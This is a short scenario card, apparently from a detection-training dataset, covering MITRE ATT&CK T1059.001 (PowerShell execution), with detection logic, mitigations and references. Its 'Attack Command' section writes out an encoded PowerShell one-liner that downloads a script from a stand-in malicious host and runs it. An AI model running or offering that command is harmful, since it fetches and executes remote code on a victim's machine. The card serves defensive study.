---
type: campaign
scenario_id: 1
tactic: Execution
technique: "T1059.001: PowerShell"
technique_id: T1059.001
tags: [campaign, lotl, execution]
---

# Executing malicious PowerShell script via encoded command to evade detection.

## Threat Description
Executing malicious PowerShell script via encoded command to evade detection.

## Attack Command
```
powershell -EncodedCommand $(echo 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://malicious.com/payload.ps1")' | base64)
```

## Detection Logic
Monitor PowerShell logs for '-EncodedCommand' with high-entropy strings; YARA rule: `rule EncodedPS { strings: $a = /powershell.*-EncodedCommand/ nocase; condition: $a }`

## Mitigation
Restrict PowerShell execution policy: `Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Restricted`; Enable PowerShell logging: `Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1`

## AI Training Prompt
Train AI to detect encoded PowerShell commands in logs and suggest execution policy restrictions.

## References
- MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
